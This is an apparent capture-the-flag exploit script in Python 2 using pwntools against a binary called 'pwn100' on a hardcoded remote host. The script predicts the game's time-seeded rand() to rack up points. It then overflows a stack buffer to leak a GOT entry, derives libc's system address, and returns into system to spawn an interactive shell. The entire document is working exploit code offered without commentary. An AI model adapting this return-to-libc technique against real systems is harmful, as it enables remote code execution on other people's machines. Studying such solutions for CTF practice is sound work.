from pwn import *
import ctypes

local = False

libc = ctypes.CDLL('libc.so.6')
elf = ELF('/media/sf_j/Downloads/pwn100')
if local:
	libc_elf = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	libc_elf = ELF('/lib32/libc.so.6')

if local:
	HOST, PORT = '0.0.0.0', 31338
else:
	HOST, PORT = '52.199.49.117', 10002
r = remote(HOST, PORT)

r.sendline('a')
r.sendline('')

money = 100
if local:
	delta = 0
else:
	delta = 1.1
while money <= 99999:
	libc.srand(int(libc.time(0) + delta))
	trial = libc.rand() % 10000 + 1
	print trial, money
	r.send(str(trial) + ' ')
	if 'win' in r.recvuntil('points\n'):
		money += 30
	else:
		money -= 30
	if money < 0:
		print 'try again'
		exit()

r.recvuntil('Comment : \n')
p = p32
u = u32

s8 = 0x8048431
save_score = 0x8048681
printstr = 0x80485fb
sh = 0x80482e6
yournameis = 0x8048acc

def leak(addr, first=False):
	if '\n' in p(addr):
		print hex(addr), 'blocked'
		return None
	payload = 'A' * 27 + p(0) + p(printstr) + p(s8) + p(addr) + p(printstr) + p(save_score) + p(yournameis)
	if not first:
		payload = 'A' + payload
	r.sendline(payload)
	r.recvuntil('Save Successfully!\n')
	data = r.recvuntil('Your name is ', drop=True) + '\x00'
	print hex(addr), `data`
	return data

got = 0x804a010
system = u(leak(got, True)[:4]) - libc_elf.symbols['fflush'] + libc_elf.symbols['system']
print hex(system)

payload = 'A' * 28 + p(0) + p(system) + p(0) + p(sh)
r.sendline(payload)
r.interactive()